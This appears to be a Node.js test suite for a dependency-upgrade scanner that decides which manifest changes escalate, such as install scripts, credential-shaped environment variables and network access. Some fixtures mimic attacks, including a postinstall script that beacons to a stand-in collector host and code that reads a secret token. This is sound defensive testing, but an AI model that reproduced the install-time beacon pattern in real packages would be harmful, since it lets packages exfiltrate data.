'use strict';

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');

const { diffManifests } = require('../lib/diff');
const { scanPackageDir } = require('../lib/scanner');
const { mkTmpDir, writePackage } = require('./helpers');

function scan(tmp, relDir, pkgJson, files) {
  return scanPackageDir(writePackage(tmp, relDir, pkgJson, files));
}

// What fails a build and what is only reported. These rules come from
// upgrading 14 popular packages to their current versions and looking at
// every escalation that produced: 16 of 16 were routine library evolution
// (build-tooling swaps, NO_COLOR support, documentation URLs). A gate that
// fires 16 times on an ordinary upgrade gets switched off, so each of those
// classes is reported without failing, while the signals that indicate an
// actual attack path still fail.
describe('what escalates on a routine dependency upgrade', () => {
  test('a changed prepare script is reported but does not escalate', () => {
    const tmp = mkTmpDir('gate-prepare');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0', scripts: { prepare: 'husky install' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0', scripts: { prepare: 'tshy' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
    assert.ok(report.changes.some((c) => c.type === 'lifecycle-script-changed' && c.escalates === false));
  });

  test('a changed postinstall script does escalate', () => {
    const tmp = mkTmpDir('gate-postinstall');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0', scripts: { postinstall: 'node build.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0', scripts: { postinstall: 'node other.js' } }, {
      'index.js': 'module.exports = {};\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('newly reading a non-credential env var is reported but does not escalate', () => {
    const tmp = mkTmpDir('gate-env-benign');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': 'if (process.env.NO_COLOR) {}\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
    assert.ok(report.changes.some((c) => c.type === 'new-env-vars' && c.escalates === false));
  });

  test('newly reading a credential-shaped env var does escalate', () => {
    const tmp = mkTmpDir('gate-env-credential');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': 'const t = process.env.MY_SECRET_TOKEN;\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('a new endpoint with no install script or credential access does not escalate', () => {
    const tmp = mkTmpDir('gate-endpoint-docs');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    // A documentation link in an error message, the shape seen on real upgrades.
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': "throw new Error('see https://example.com/docs/errors for details');\n",
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
  });

  test('a new endpoint in a package that also runs at install time does escalate', () => {
    const tmp = mkTmpDir('gate-endpoint-exfil');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0', scripts: { postinstall: 'node s.js' } }, {
      's.js': 'module.exports = {};\n',
    });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0', scripts: { postinstall: 'node s.js' } }, {
      's.js': "require('https').request('https://collector.example.net/beacon');\n",
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('the env capability appearing on its own does not escalate', () => {
    const tmp = mkTmpDir('gate-env-category');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': 'const p = process.env.no_proxy;\n',
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, false);
    assert.ok(
      report.changes.some((c) => c.type === 'capability-added' && c.category === 'env' && c.escalates === false)
    );
  });

  test('network capability appearing on its own still escalates', () => {
    const tmp = mkTmpDir('gate-network-category');
    const before = scan(tmp, 'v1', { name: 'p', version: '1.0.0' }, { 'index.js': 'module.exports = {};\n' });
    const after = scan(tmp, 'v2', { name: 'p', version: '2.0.0' }, {
      'index.js': "const https = require('https');\n",
    });
    const report = diffManifests(before, after);
    assert.equal(report.escalated, true);
  });

  test('a cache-fill method named fetch is not network access', () => {
    // lru-cache's fetch(k, opts) made lru-cache and everything bundling it
    // read as having network access.
    const tmp = mkTmpDir('fetch-method');
    const m = scan(tmp, 'pkg', { name: 'cache', version: '1.0.0' }, {
      'index.js': 'class C {\n  async fetch(k, opts = {}) { return this.#fetch(k, opts); }\n}\n',
    });
    assert.equal(m.capabilities.network.present, false);
  });

  test('real uses of the fetch web API are still network access', () => {
    const tmp = mkTmpDir('fetch-real');
    for (const src of [
      "const r = await fetch(url);\n",
      "fetch('https://example.com/api');\n",
      'globalThis.fetch(u);\n',
    ]) {
      const m = scan(tmp, 'pkg-' + Math.random().toString(36).slice(2), { name: 'p', version: '1.0.0' }, {
        'index.js': src,
      });
      assert.equal(m.capabilities.network.present, true, `should detect network in: ${src}`);
    }
  });
});
